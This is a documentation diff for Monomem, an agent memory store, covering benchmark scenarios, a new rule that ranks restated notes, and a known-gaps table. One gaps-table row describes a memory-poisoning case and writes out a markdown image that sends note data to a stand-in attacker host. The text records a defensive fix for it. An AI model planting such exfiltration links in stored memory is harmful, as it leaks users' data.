@@ -67,12 +67,14 @@ printed in its own section and does not fail the run (use `--strict-gaps` to fai
 scenario starts to pass, the run **fails** with "known gap now PASSES": remove the marker and mark the gap
 `fixed`. The current list is in the README's "Benchmark" section.
 
-**OneMemory 1.6.0 closed every gap OneMemory 1.5.0 recorded** (`GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE`, all now `fixed`), so no
-shipped scenario carried a marker until Monomem 1.5.0 (this release) added **`GAP-OBSOLETE-UNREPLACED`** (scenario A33, open): when a later
-note updates a fact in different words and nobody replaces the old note, keyword search and the "what is relevant" lookup rank the
-**old** note first (it matches the query as well and is shorter, so BM25 scores it higher; newest-first only breaks exact ties). The
-SessionStart injection does carry the new value. With the replace step (A34) the old value is gone from all three. Two honest
-notes on what "closed" means for the earlier gaps:
+**OneMemory 1.6.0 closed every gap OneMemory 1.5.0 recorded** (`GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE`, all now `fixed`).
+Monomem 1.5.0 (this release) found one more, **`GAP-OBSOLETE-UNREPLACED`** (scenario A33), and fixed it in the same release, so
+**no gap is open** and no shipped scenario carries a marker. The gap: when a later note updates a fact in different words and nobody
+replaces the old note, keyword search and the "what is relevant" lookup ranked the **old** note first (it matches the query as well and
+is shorter, so BM25 scores it higher; newest-first only breaks exact ties). The fix is the restated-twin rule (below, under the
+obsolete-fact test): for the same writer, the same subject and a near tie, the newer note now goes first and the old one comes right
+behind it, labelled `restated_by`. With the replace step (A34) the old value is gone from all three. Two honest notes on what
+"closed" means for the earlier gaps:
 
 - Five of the old gap scenarios (A05, A06, A10, A20, B03) now include the replace steps: the agent *replaces* the old note through
   the two-step preview and confirm. Monomem still does **not** guess that a new note replaces an old one and hide the old one by
@@ -120,7 +122,7 @@ is the identity the system should stamp (default: the actor's name). `server` pu
 instance (default `main`), which is how a note is moved between two servers.
 
 **Steps.** Each step has `op` and `as` (an actor). Results are stored under `id`; `write`, `update`, `delete`,
-`archive`, `unarchive`, `read`, `merge`, `distrust`, `undistrust` and `trust_server` get the default id
+`archive`, `unarchive`, `read`, `pin`, `confirm`, `merge`, `distrust`, `undistrust` and `trust_server` get the default id
 `<op>:<ref>` (or `<op>:<writer>`), so a check can say `"step": "write:n"`.
 
 | `op` | Fields | What it does |
@@ -132,6 +134,7 @@ instance (default `main`), which is how a note is moved between two servers.
 | `supersede_preview` | `id`, `old` (refs), `new_note` (`{title, body, tags, confidence}`) or `new_ref` | Step 1 of a replacement. Must change nothing. Stores the one-time code under `id`. |
 | `supersede_confirm` | `id`, `from` (a preview step's id), `new_note`, `acknowledge_risk`, `ref`, `corrupt_code` | Step 2. Uses the code from `from` (the same new text unless `new_note` is given; `corrupt_code` damages the code). `ref` names the replacement note. Run it `as` another actor to test that a code works for nobody else. |
 | `supersede_undo` | `ref` | Bring a replaced note back. |
+| `confirm` | `ref` | A person confirms the note's current version (needs `confirm`; Monomem: an admin token's confirm, the dashboard's). A confirm that does not count is `invalid`. |
 | `history`, `restore_version` | `ref`, `id`; `version`, `if_rev_of` | A note's earlier versions; put one back as a new version. |
 | `list`, `recall`, `changes`, `sweep` | `id` | List notes, "what is relevant to this message" (`q`), the change feed, run the expiry sweep. |
 | `distrust`, `undistrust` | `writer`, `namespace` | Manage the distrust list. |
@@ -338,10 +341,23 @@ nothing new on disk, but the words are in RAM for the life of the process and ca
 drops answer accuracy from 100 % to 44.6 %. Two provenance scenarios measure it here, in the stale suite: A33 writes a fact and a
 later update in different words (10 unrelated notes around them) and does **not** replace the old note; A34 does the same and then
 replaces it (preview, confirm). Both check search, the "what is relevant" lookup and the SessionStart injection. Result: **A34
-passes** (current value first everywhere, obsolete value absent from all three); **A33 fails and is recorded as a known gap**: the
-obsolete note is ranked **first** by both search and the lookup, and the SessionStart text carries the current value but the old
-note too. So without the replace step, the answer to "does recall return the current value first?" is **no** in this case.
-Full `monomem bench` after adding them: 132 passed, 1 known gap (A33), 0 failed; stale-hit-rate@5 2/16, current-recall@1 15/15.
+passes** (current value first everywhere, obsolete value absent from all three); **A33 failed and was recorded as a known gap**: the
+obsolete note was ranked **first** by both search and the lookup, and the SessionStart text carried the current value but the old
+note too. Full `monomem bench` after adding them: 132 passed, 1 known gap (A33), 0 failed; stale-hit-rate@5 2/16, current-recall@1 15/15. (That was the state when A33 was added. The same-writer restatement rule later in 1.5.0 fixed it: 137 passed, 0 known gaps.)
+
+**Restated-twin rule (GAP-OBSOLETE-UNREPLACED fixed, 1.5.0).** The twin pass that keeps a stale note behind its newer twin now
+has a second rule. An older note moves to just behind a newer one when **all** of these hold: same namespace, both plain notes; the
+newer note was written after the older one last changed; the **same server-stamped writer** (that writer could already edit the old
+note in place, so the reorder gives it nothing new); the same subject (a fact key with another value, or a similarity link of at
+least 0.6); a near tie (the old score is at most 1.5 times the new one, after boosts and penalties); the newer note is inside the
+returned results; the older note is not read clearly more than the newer one. It never moves for a different writer (that is the
+dispute label's job: one agent must not bury another's note), behind an unconfirmed note when the older one is confirmed by a person,
+or behind a note that is held (unconfirmed outside content, flagged, built on a distrusted writer), replaced or distrusted. Nothing is
+dropped: the older note carries `restated_by` and `restated_label` (REST, MCP, the CLI) and an explain line. The similarity bar is
+0.6, not the 0.35 first designed: at 0.35, A37 (the same project's build server and API server, written by one writer) reordered;
+at 0.5, LoCoMo-10 session (with similarity links built, see below) lost 0.3 points of Rall@5 and Rall@10; at 0.6 nothing moved. A33's
+pair sits between 0.6 and 0.7, so A33 passes (seeds 1 to 12), with a thin margin. Scenarios A35 to A38 are the guards: another writer (A35), a person-confirmed note (A36, which needs
+the new `confirm` step), another subject (A37), outside content (A38). Full `monomem bench`: 137 passed, 0 known gaps, 0 failed.
 
 **MemoryAgentBench (C-07): skipped, not run.** What its README (github.com/HUST-AI-HYZ/MemoryAgentBench, read 2026-11-14)
 says: the accurate-retrieval and FactConsolidation splits are scored by substring match, not by a judge, but the answer that is
@@ -582,7 +598,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **One is open:** `GAP-OBSOLETE-UNREPLACED` (A33, added in 1.5.0).
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -592,7 +608,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
-| `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Open.** The two-step replace (A34) removes the old value everywhere; session start already carries the new value. | A33 (known gap) |
+| `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
 any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
